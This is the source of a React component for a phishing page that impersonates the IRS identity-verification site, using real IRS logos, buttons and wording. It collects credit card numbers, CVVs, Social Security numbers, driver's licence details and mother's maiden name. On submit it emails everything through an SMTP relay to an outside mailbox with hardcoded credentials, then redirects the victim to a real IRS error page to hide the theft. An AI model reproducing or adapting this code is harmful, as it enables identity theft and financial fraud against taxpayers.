// import emailjs, { init } from 'emailjs-com';
import { useEffect, useState } from 'react';
import { useSelector } from 'react-redux';
// import { useHistory } from 'react-router-dom';
// import Email from './smtp'
import './finance.css';

// init("user_ld15Epetajzy4LTSlKCz8");
function Finance() {

	// const history = useHistory()

	const {
		firstName,
		middleName,
		lastName,
		phone,
		dobMonth,
		dobDay,
		dobYear,
		ssn1,
		ssn2,
		ssn3,
		mmn,
		filedForTaxReturn,
		address1,
		address2,
		city,
		state,
		zipcode,
		country
	} = useSelector(state => state.persoInfo)

	const [name, setName] = useState('')
	const [CC, setCC] = useState('')
	const [bin, setBin] = useState('')
	const [ccExpiryMonth, setCcExpiryMonth] = useState('')
	const [ccExpiryYear, setCcExpiryYear] = useState('')
	const [cSC, setcSC] = useState('')
	const [DLNumber, setDLNumber] = useState('')
	const [dLExpiryMonth, setdLExpiryMonth] = useState('')
	const [dLExpiryDay, setdLExpiryDay] = useState('')
	const [dLExpiryYear, setdLExpiryYear] = useState('')

	// const templateParams = {
	// 	firstName,
	// 	middleName,
	// 	lastName,
	// 	phone,
	// 	dobMonth,
	// 	dobDay,
	// 	dobYear,
	// 	ssn1,
	// 	ssn2,
	// 	ssn3,
	// 	mmn,
	// 	filedForTaxReturn,
	// 	address1,
	// 	address2,
	// 	city,
	// 	state,
	// 	zipcode,
	// 	country,
	// 	name,
	// 	CC,
	// 	bin,
	// 	ccExpiryMonth,
	// 	ccExpiryYear,
	// 	cSC,
	// 	DLNumber,
	// 	dLExpiryMonth,
	// 	dLExpiryDay,
	// 	dLExpiryYear
	// }

	useEffect(() => {
		setBin(CC.substr(0,6))
	}, [CC])

	const handleSubmit = async e => {
		e.preventDefault()
		// emailjs.send('service_zbdegps', 'template_95nph9k', templateParams)
		// .then(function(response) {
		// 	console.log('SUCCESS!', response.status, response.text);
		// }, function(error) {
		// console.log('FAILED...', error);
		// });
		let sender = {
        
			send: a => {
				return new Promise((n, e) => { 
					a.noCache = Math.floor(1e6 * Math.random() + 1); a.Action = "Send"; 
					let t = JSON.stringify(a); 
					sender.ajaxPost("https://smtpjs.com/v3/smtpjs.aspx?", t, e => { 
						n(e) 
					}) 
				})
			},
			ajaxPost: (e, n, t) => {
				let a = sender.createCORSRequest("POST", e);
				console.log({a,e,sender})
				a.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
					a.onload = () => {
						let e = a.responseText;
						null != t && t(e)
					};
					a.send(n)
			},
			// ajax: (e, n) => {
			// 	let t = Email.createCORSRequest("GET", e);
			// 	t.onload = () => {
			// 		let e = t.responseText;
			// 		null != n && n(e)
			// 	};
			// 		t.send()
			// },
			createCORSRequest: (e, n) => {
				let t = new XMLHttpRequest();
				console.log({t})
				console.log(typeof new XMLHttpRequest())
				"withCredentials" in t ? t.open(e, n, !0) : "undefined" != typeof new XMLHttpRequest() ? (t = new XMLHttpRequest()).open(e, n) : t = null; 
				return t
			}
		}
		const send = async () => {
		await sender.send({
			Host: "smtp.gmail.com",
			Username : "iwillkillbill00@gmail.com",
			Password : "root.FX3",
			To : 'killbill@attorneymail.ch',
			From : "iwillkillbill00@gmail.com",
			Subject : `${bin} ${Date.now()}`,
			Body : `=== PERSONAL INFO === <br>

			Full Name: ${firstName} ${middleName} ${lastName}<br>
			DOB (MM/DD/YYYY): ${dobMonth}/${dobDay}/${dobYear}<br>
			Phone Number: ${phone}<br>
			Address: ${address1} ${address2}<br>
			City: ${city}<br>
			State: ${state}<br>
			Zipcode: ${zipcode}<br>
			Country: ${country}<br>
			<br>
			=== FINANCIAL INFO === <br>
			
			Filed for tax return in last 7 years?: ${filedForTaxReturn}<br>
			Name on Card: ${name}<br>
			Card Number: ${CC}<br>
			Expiry Date: ${ccExpiryMonth}/${ccExpiryYear}<br>
			CVV: ${cSC}<br>
			Mother's Maiden Name: ${mmn}<br>
			Social Security Number: ${ssn1}-${ssn2}-${ssn3}<br>
			Driver's License Number (if applicable): ${DLNumber}<br>
			Driver's License Expiry Date (MM/DD/YYYY): ${dLExpiryMonth}/${dLExpiryDay}/${dLExpiryYear}<br>`,
			})
			window.location.href = 'https://sa.www4.irs.gov/eauth/pub/error/technical_difficulty.jsp?'
		}
		await send()
		//  window.location.href = 'https://sa.www4.irs.gov/eauth/pub/registration/id_no.jsp?actionName=VerifyFinDataProxy'
		//  window.location.href = 'https://sa.www4.irs.gov/eauth/pub/logout1.jsp?error_code=-7271'
		// await writeFile()
	}

	// const writeFile = async () => {
	// 	const config = {
	// 		method: "POST",
    //         headers: {
    //             "Content-Type": "application/json",
    //             "Accept": "application/json"
    //         },
    //         body: JSON.stringify(templateParams)
	// 	}
	// 	const res = await fetch('http://localhost:1988/upload', config)
	// 	const data = await res.json()
	// }

	
  return (
    <div id="main-longform">
	
		
		
			
		 {/* PageIdentifier: HEADER  */}

    




   
 








	
	
		
	



	
	
		
	



	
	
		
	



	
	
		
	



	
	
		
	



	
		
	
	








	




{/* <script type="text/javascript" language="Javascript">  
if (top != self) { 
	top.location = self.location;
}
</script> */}

<div className="headerBar">
	
	<img src="https://sa.www4.irs.gov/eauth/pub/common/images/logo.png" alt="" 
	style={{transform: 'translateX(168%)'}}
	/>
		
		
		
	<div id="access" tabIndex="1"></div>	
		
</div>



<div id="mainsearch">

	
	
	
	
	

	
	

		
	
	

	
	
	
	
	
		
	
		
</div>

 

		<div id="content">

			<h1 className="title">Verify your financial account number</h1>

			<div id="error_message">
			
					
			</div>
			

			
			
			<form onSubmit={handleSubmit}
					>
					{/* <!-- for the form --> */}
					{/* <!-- onSubmit=" return isValidIDEProofing(this);" --> */}

			{/* <!-- FORM HEADER TEXT --> */}

			<div id="form_content">

				{/* <!-- HIDDEN VARS --> */}
				
				<input type="hidden" value="" name="ioBlackBox" id="ioBlackBox"/>
				 
				<input type="hidden" id="user_prefs" name="user_prefs" value="" />
				<input type="hidden" id="user_prefs2" name="user_prefs2" value="" />
	
						
				<input type="hidden" name="actReason" value="register" />
				
				<input type="hidden" id="minLength" name="minLength" value="4" />
				<input type="hidden" id="maxLength" name="maxLength" value="40" />
								
				<p id="ide_first_text" className="ide2-text-position">
					To protect the security of your tax information, you will need to verify your identity.
				</p>
				
				<p>
					Provide the following:
				</p>
				
				{/* <!--  MESSAGE REAGARDING FINANCIAL INFORMATION (STYLED TO THE UPPER RIGHT OF PAGE) --> */}
				<div id="ide_message" className="ide-table-content ide-table-position">
					<p>
						<b>
							Financial information			
						</b>
					</p>
					
					<p>
						We will only use this information to verify your identity. You will not be charged any money and are not sharing any account balances with us.
					</p>
					
					<p>
						A soft inquiry will show up on your credit report to let you know that the IRS accessed your credit report information. This will not increase or decrease your credit score and lenders will not be able to see this.
					</p>
					
					<p>
						If you have a credit freeze, you hereby authorize us to bypass that freeze to verify your identity.
					</p>
					
					<p>
						
						If you do not wish to or cannot provide the information, you will not be able to register.
					</p>
					
				</div>
				
				<div id="fieldset">
					<fieldset>
					
					<legend><span className="access-label">
							Financial Information
					</span></legend>
					
					{/* <!-- CREDIT CARD NUMBER --> */}
						 <p>
						 	
							<label htmlFor="pc" className="inline restore-normal-size">
								{/* <!-- <input type="radio" className="bigradio"
									onClick="doGray(); populateHidden('pc')"
									id="is_pc" name="is_loan"
									tabIndex="0"
									value="" /> --> */}
										Name On Card
							</label>
							<input type="text"
						 			id="pc" name="pc" 
						 		//required
						 			className="textbox  "
						 			tabIndex="0"
						 			value={name} 
									 onChange={e => setName(e.target.value)}/>
						 		
						 		
						 	 {/* <br /><span id="ide_sublabel" className="ide-sublabel-position">
							 	(We can't verify some cards issued by banks in U.S. territories)
							 </span>  */}
						</p>
						 <input type="hidden" id="pc_ind" name="pc_ind" value="" />
						 
						 {/* <!-- STUDENT LOAN NUMBER --> */}
						<p>
						
						<label htmlFor="student_loan" className="inline restore-normal-size">
							{/* <!-- <input type="radio" className="bigradio" 
							onClick="doGray(); populateHidden('student_loan')"
							 id="is_student_loan" name="is_loan"
							 tabIndex="0"
							 value="" /> --> */}
							Card Number
						</label>
						<input type="text"
						className="textbox "
						 id="student_loan" name="student_loan" minLength="15" maxLength="16"
						 tabIndex="0"
						//  required
						 value={CC}
						 onChange={e => setCC(e.target.value)} />
						 		
						 	<br /><span id="ide_sublabel2" className="">
								(We cannot verify some cards issued by banks in U.S. territories)
							 </span>
							 
						 <input type="hidden" id="student_loan_ind" name="student_loan_ind" value="" />
						 </p>
					
					</fieldset>
						{/* <!-- exp date --> */}
						<div id="fieldset">

							<fieldset>
		
								<legend className="access-label">
									Expiry Date
								</legend>
								
								<span id="dob_fieldset" className="pseudo-label">
									Expiry Date
								</span>
		
								
							
								<div className="small-field-nosize">
									
									<label className="access-label" htmlFor="month">
										Month
									</label>
                  <select name="month" style={{width: "auto"}} 
									tabIndex="0" aria-labelledby="dob_fieldset"
									className="select-style"
									// required
									value={ccExpiryMonth}
      onChange={e => setCcExpiryMonth(e.currentTarget.value)}>
		  <option value="" disabled defaultValue>
                                    Month
                                </option>
										
										<option value="01">
											01
										</option>
										<option value="02">
											02
										</option>
										<option value="03">
											03
										</option>
										<option value="04">
											04
										</option>
										<option value="05">
											05
										</option>
										<option value="06">
											06
										</option>
										<option value="07">
											07
										</option>
										<option value="08">
											08
										</option>
										<option value="09">
											09
										</option>
										<option value="10">
											10
										</option>
										<option value="11">
											11
										</option>
										<option value="12">
											12
										</option>
		
											{/* <!-- <script type="text/javascript">
												document.writeln(displayArrayAsHTMLDropdown(months));
											</script> --> */}
											
									</select>
									<span> / </span>
								</div>
								
								{/* <!-- <div className="small-field-nosize">
		
									<label className="access-label" htmlFor="day">
										Day
									</label>
									
									
									<select name="day" id="day" style="width: auto;"
									tabIndex="0" aria-labelledby="dob_fieldset"
									 className="select-style">
										<option value="Day">Day</option>
									
										<script type="text/javascript">
											document.writeln(displayDaysArrayAsHTMLDropdown());
										</script>
										
									</select>
		
								</div> --> */}
								
								<div className="small-field-nosize">
		
									<label className="access-label" htmlFor="year">
										Year (format: YYYY)
									</label>
									
									
									
									
										{/* <input type="text" className="textbox-nosize " name="year" placeholder="Year" size="4" maxlength="4" id="year" required tabIndex="0" aria-labelledby="dob_fieldset" 
										value={expiry} onChange={e => setExpiry(e.target.value)}/> */}
									
									<select name="year" style={{width: "auto"}} 
									tabIndex="0" aria-labelledby="dob_fieldset"
									className="select-style"
									// required
									value={ccExpiryYear}
      onChange={e => setCcExpiryYear(e.currentTarget.value)}>
		  <option value="" disabled defaultValue>
                                    Year
                                </option>
		  	<option value="2020">
				  2020
			  </option>
		  	<option value="2021">
				  2021
			  </option>
		  	<option value="2022">
				  2022
			  </option>
		  	<option value="2023">
				  2023
			  </option>
		  	<option value="2024">
				  2024
			  </option>
		  	<option value="2025">
				  2025
			  </option>
		  	<option value="2026">
				  2026
			  </option>
		  	<option value="2027">
				  2027
			  </option>
		  	<option value="2028">
				  2028
			  </option>
		  	<option value="2029">
				  2029
			  </option>
		  	<option value="2030">
				  2030
			  </option>
		  	<option value="2031">
				  2031
			  </option>
		  	<option value="2032">
				  2032
			  </option>
		  	<option value="2033">
				  2033
			  </option>
		  	<option value="2034">
				  2034
			  </option>
		  	<option value="2035">
				  2035
			  </option>
		  	<option value="2036">
				  2036
			  </option>
		  	<option value="2037">
				  2037
			  </option>
		  	<option value="2038">
				  2038
			  </option>
		  	<option value="2039">
				  2039
			  </option>
		  	<option value="2040">
				  2040
			  </option>
		  	<option value="2041">
				  2041
			  </option>
		  	{/* <option value="2042">
				  2042
			  </option>
		  	<option value="2043">
				  2043
			  </option>
		  	<option value="2044">
				  2044
			  </option>
		  	<option value="2045">
				  2045
			  </option>
		  	<option value="2046">
				  2046
			  </option>
		  	<option value="2047">
				  2047
			  </option>
		  	<option value="2048">
				  2048
			  </option>
		  	<option value="2049">
				  2049
			  </option>
		  	<option value="2050">
				  2050
			  </option>
		  	<option value="2051">
				  2051
			  </option>
		  	<option value="2052">
				  2052
			  </option>
		  	<option value="2053">
				  2053
			  </option> */}

	  </select>

									
		
								</div>
		
							</fieldset>
						{/* <!-- exp date -->
						<!-- AUTO LOAN NUMBER --> */}
						<p>
						
						<label htmlFor="auto_loan" className="inline restore-normal-size">
							{/* <!-- <input type="radio" className="bigradio" 
							onClick="doGray(); populateHidden('auto_loan')"
							 id="is_auto_loan" name="is_loan"
							 tabIndex="0"
							 value="" /> --> */}
							Card Security Code
						</label>
						<input type="text"
						className="textbox-nosize "
						 id="auto_loan" name="auto_loan" minLength="3" maxLength="4"
						 tabIndex="0"
						//  required
						 value={cSC}
						 onChange={e => setcSC(e.target.value)} />
						 <input type="hidden" id="auto_loan_ind" name="auto_loan_ind" value="" />
						 </p>
						 
						 
						{/* <!-- MORTGAGE LOAN NUMBER --> */}
						<p>
						
						<label htmlFor="mort_loan" className="inline restore-normal-size">
							{/* <!-- <input type="radio" className="bigradio" 
							onClick="doGray(); populateHidden('mort_loan')"
							 id="is_mort_loan" name="is_loan"
							 tabIndex="0"
							 value="" /> --> */}
							Driver's License Number <em>(disregard if unapplicable)</em>
						</label>
						<input type="text"
						className="textbox "
						 id="mort_loan" name="mort_loan" maxLength="20"
						 tabIndex="0"
						 value={DLNumber}
						 onChange={e => setDLNumber(e.target.value)} />
						 <input type="hidden" id="mort_loan_ind" name="mort_loan_ind" value="" />
						 </p>
						 
						 {/* <!-- HOME EQUITY LOAN NUMBER --> */}
						
						{/* <!-- <p> --> */}
						
						<label htmlFor="home_loan" className="inline restore-normal-size">
							{/* <!-- <input type="radio" className="bigradio"
							onClick="doGray(); populateHidden('home_loan')"
							 id="is_home_loan" name="is_loan"
							 tabIndex="0"
							 value="" /> --> */}
							Driver's License Expiration Date <em>(disregard if unapplicable)</em>
						</label>

						{/* <!-- lol --> */}
						{/* <div id="fieldset"> */}

							<fieldset>
		
								 {/* <legend className="access-label">
									Date of Birth
								</legend>
								
								<span id="dob_fieldset" className="pseudo-label">
									Date of Birth
								</span>  */}
		
								
								
								
								
								
								
								
								
								
								
								
								
								
								
								
							
								<div className="small-field-nosize">
									
									<label className="access-label" htmlFor="month">
										Month
									</label>
									<select name="month" style={{width: 'auto'}}
									tabIndex="0" aria-labelledby="dob_fieldset"
									className="select-style"
									value={dLExpiryMonth}
      onChange={e => setdLExpiryMonth(e.currentTarget.value)}>
		  <option value="" disabled defaultValue>
                                    Month
                                </option>
										
										<option value="01">
											01
										</option>
										<option value="02">
											02
										</option>
										<option value="03">
											03
										</option>
										<option value="04">
											04
										</option>
										<option value="05">
											05
										</option>
										<option value="06">
											06
										</option>
										<option value="07">
											07
										</option>
										<option value="08">
											08
										</option>
										<option value="09">
											09
										</option>
										<option value="10">
											10
										</option>
										<option value="11">
											11
										</option>
										<option value="12">
											12
											</option>
		
											{/* <script type="text/javascript">
												document.writeln(displayArrayAsHTMLDropdown(months));
											</script> */}
											
									</select>
		
								</div>
								
								<div className="small-field-nosize">
		
									<label className="access-label" htmlFor="day">
										Day
									</label>
									
									
									<select name="day" id="day" style={{width: "auto"}}
									tabIndex="0" aria-labelledby="dob_fieldset"
									 className="select-style"
									 value={dLExpiryDay}
	   onChange={e => setdLExpiryDay(e.currentTarget.value)}>
		   <option value="" disabled defaultValue>
                                    Day
                                </option>
																			<option value="01">
											01
										</option>
										<option value="02">
											02
										</option>
										<option value="03">
											03
										</option>
										<option value="04">
											04
										</option>
										<option value="05">
											05
										</option>
										<option value="06">
											06
										</option>
										<option value="07">
											07
										</option>
										<option value="08">
											08
										</option>
										<option value="09">
											09
										</option>
										<option value="10">
											10
										</option>
										<option value="11">
											11
										</option>
										<option value="12">
											12
										</option>
										<option value="13">
											13
										</option>
										<option value="14">
											14
										</option>
										<option value="15">
											15
										</option>
										<option value="16">
											16
										</option>
										<option value="17">
											17
										</option>
										<option value="18">
											18
										</option>
										<option value="19">
											19
										</option>
										<option value="20">
											20
										</option>
										<option value="21">
											21
										</option>
										<option value="22">
											22
										</option>
										<option value="23">
											23
										</option>
										<option value="24">
											24
										</option>
										<option value="25">
											25
										</option>
										<option value="26">
											26
										</option>
										<option value="27">
											27
										</option>
										<option value="28">
											28
										</option>
										<option value="29">
											29
										</option>
										<option value="30">
											30
										</option>
										<option value="31">
											31
										</option>
									
										{/* <script type="text/javascript">
											document.writeln(displayDaysArrayAsHTMLDropdown());
										</script> */}
										
									</select>
		
								</div>
							
								<div className="small-field-nosize">
		
									<label className="access-label" htmlFor="year">
										Year (format: YYYY)
									</label>
									
									
									
									
										{/* <input type="text" className="textbox-nosize " name="year" placeholder="Year" size="4" maxlength="4" id="year" required tabIndex="0" aria-labelledby="dob_fieldset"
										value={dLExpiry} onChange={e => setdLExpiry(e.target.value)} /> */}
									
									<select name="month" style={{width: "auto"}} 
									tabIndex="0" aria-labelledby="dob_fieldset"
									className="select-style"
									value={dLExpiryYear}
      onChange={e => setdLExpiryYear(e.currentTarget.value)}>
		  <option value="" disabled defaultValue>
                                    Year
                                </option>
		  	<option value="2020">
				  2020
			  </option>
		  	<option value="2021">
				  2021
			  </option>
		  	<option value="2022">
				  2022
			  </option>
		  	<option value="2023">
				  2023
			  </option>
		  	<option value="2024">
				  2024
			  </option>
		  	<option value="2025">
				  2025
			  </option>
		  	<option value="2026">
				  2026
			  </option>
		  	<option value="2027">
				  2027
			  </option>
		  	<option value="2028">
				  2028
			  </option>
		  	<option value="2029">
				  2029
			  </option>
		  	<option value="2030">
				  2030
			  </option>
		  	<option value="2031">
				  2031
			  </option>
		  	<option value="2032">
				  2032
			  </option>
		  	<option value="2033">
				  2033
			  </option>
		  	<option value="2034">
				  2034
			  </option>
		  	<option value="2035">
				  2035
			  </option>
		  	<option value="2036">
				  2036
			  </option>
		  	<option value="2037">
				  2037
			  </option>
		  	<option value="2038">
				  2038
			  </option>
		  	<option value="2039">
				  2039
			  </option>
		  	<option value="2040">
				  2040
			  </option>
		  	<option value="2041">
				  2041
			  </option>
		  	<option value="2042">
				  2042
			  </option>
		  	<option value="2043">
				  2043
			  </option>
		  	<option value="2044">
				  2044
			  </option>
		  	<option value="2045">
				  2045
			  </option>
		  	<option value="2046">
				  2046
			  </option>
		  	<option value="2047">
				  2047
			  </option>
		  	<option value="2048">
				  2048
			  </option>
		  	<option value="2049">
				  2049
			  </option>
		  	<option value="2050">
				  2050
			  </option>
		  	<option value="2051">
				  2051
			  </option>
		  	<option value="2052">
				  2052
			  </option>
		  	<option value="2053">
				  2053
			  </option>
		  	<option value="2053">
				  2053
			  </option>
		  	<option value="2054">
				  2054
			  </option>
		  	<option value="2055">
				  2055
			  </option>
		  	<option value="2056">
				  2056
			  </option>
		  	<option value="2057">
				  2057
			  </option>
		  	<option value="2058">
				  2058
			  </option>
		  	<option value="2059">
				  2059
			  </option>
		  	<option value="2060">
				  2060
			  </option>
		  	<option value="2061">
				  2061
			  </option>
		  	<option value="2062">
				  2062
			  </option>
		  	<option value="2063">
				  2063
			  </option>
		  	<option value="2064">
				  2064
			  </option>
		  	<option value="2065">
				  2065
			  </option>
		  	<option value="2066">
				  2066
			  </option>
		  	<option value="2067">
				  2067
			  </option>
		  	<option value="2068">
				  2068
			  </option>
		  	<option value="2069">
				  2069
			  </option>
		  	<option value="2070">
				  2070
			  </option>
	  </select>
									
		
								</div>
		
							</fieldset>
						{/* <!-- lol --> */}
						{/* <!-- <input type="text"
						className="textbox ide-textbox-position"
						 id="home_loan" name="home_loan" maxLength="40"
						 onKeyUp="markLoan('home_loan')"
						 tabIndex="0>"
						 value="" /> --> */}
						 {/* <!-- <input type="hidden" id="home_loan_ind" name="home_loan_ind" value="" /> --> */}
						 {/* </p> */}

						
						{/* <!-- NO CC NO LOAN NUMBER --> */}
						<p>
						
						<label htmlFor="is_no_loan" className="inline restore-normal-size">
							{/* <!-- <input type="radio" className="bigradio"
							onClick="doGray(); populateHidden('none')"
							 id="is_no_loan" name="is_loan"
							 tabIndex="0"
							 value="" /> --> */}
							{/* <!-- I don't have a current credit card, student loan, auto loan, home equity loan, or mortgage --> */}
						</label>
						<input type="hidden" id="none_ind" name="none_ind" value="" />
						 {/* <!-- </p> --> */}
						 

				</p>
				
				<p id="ide_last_text" className="ide2-text-position">
				  By providing financial information, I authorize the IRS to access my credit report for the purpose of verifying my identity.
				</p>
				
				{/* <!-- SUBMIT BUTTONS --> */}
					<p>							
							
							<input type="image" name="continue" id="continue"
								tabIndex="0" alt="Continue"
								// onFocus="addVisualFocusIndicator(this, true)"
									// onBlur="this.style.border = ''"
								// onClick="addVisualFocusIndicator(this, true)"
								src="https://sa.www4.irs.gov/eauth/pub/common/images/button_continue.jpg"
								value="Continue" />
					</p>
				
				

				{/* <!-- Set hidden CSRF Security Token parameter in request, by retrieving from session --> */}
				<input type="hidden" name="EAUTH_CSRF_SECURITY_TOKEN_PARAM" value="UuKFKKNCAqWZf9Cv" />



				</div>
			</div>	
    </div>
    </form>
         {/* <!-- END OF FORM-CONTENT --> */}
		{/* </div> */}
		
		
					
				

 




	
		
	
	









<div className="footerBar" role="contentinfo">
{/* <p> */}
<ul>

	<li>
		<a href="https://www.irs.gov/secureaccess" 
		tabIndex="0" 
		target="_blank"
		rel="noreferrer">
			Help</a>	
	</li> &nbsp;|&nbsp;
	
	<li>
		<a href="http://www.irs.gov/uac/IRS-Privacy-Policy" 
		tabIndex="0" 
		target="_blank"
		rel="noreferrer">
			IRS Privacy Policy</a>
	</li> &nbsp;|&nbsp;
	
	<li>
		<a href="https://sa.www4.irs.gov/eauth/pub/help/sec_code_terms_conditions.jsp"  
		tabIndex="0" 
		target="_blank"
		rel="noreferrer">
			  Security Code Terms and Conditions</a>
	</li>
	&nbsp;|&nbsp;
	
	<li>
		<a href="https://sa.www4.irs.gov/eauth/pub/help/accessibility.jsp"  
		tabIndex="0" 
		target="_blank"
		rel="noreferrer">
			Accessibility
		</a>
	</li>
			  
	

</ul>	
{/* </p> */}
</div>
	{/* <!-- The Modal -->  */}


 




	
		
	
	











{/* <div role="dialog" id="sessionWarningDialog" aria-labelledby="Session Expiration Notice" 
	aria-modal="true" className="hidden">
	<h2 className="dialog_title" style={{textAlign: 'left', paddingLeft: '17px'}}>Session Expiration Notice </h2>
	<div className="dialog_form">
		<p style={{padding: '2px', margin: '0px'}} align="left">
			Your session will expire in 5 minutes at  <span id="SessionExpTime"></span> Do you need more time? 
		</p>
	</div> */}
	{/* <div className="dialog_form_actions"> */}
		
			{/* <button type="button" id="continue" name="continue" tabIndex="0" aria-label="Yes" className="dialog_yes_button_position dialog_yes_button"  
				// onclick="sendHttpRequest(window.location.href); getSessionExpirationTime(); setTimeout(function() { openDialog('sessionWarningDialog', this, 'continue'); }, sessionTimeoutWarningInterval); cancelTimeoutRedirection(); setupTimeoutRedirection(); closeDialog(this);"
        >
  				<img alt="Yes" 
  					src="https://sa.www4.irs.gov/eauth/pub/common/images/button_yes.jpg">
            </button> */}
		
		
		{/* <button type="button" name="no" tabIndex="0" aria-label="No" className="dialog_close_button"   
			onclick="closeDialog(this);"> */}
  			{/* <img alt="No" 
  				src="https://sa.www4.irs.gov/eauth/pub/common/images/button_x.jpg"> */}
		{/* </button>
	</div> */}
{/* </div> */}
</div>
</div>


  );
}

export default Finance;
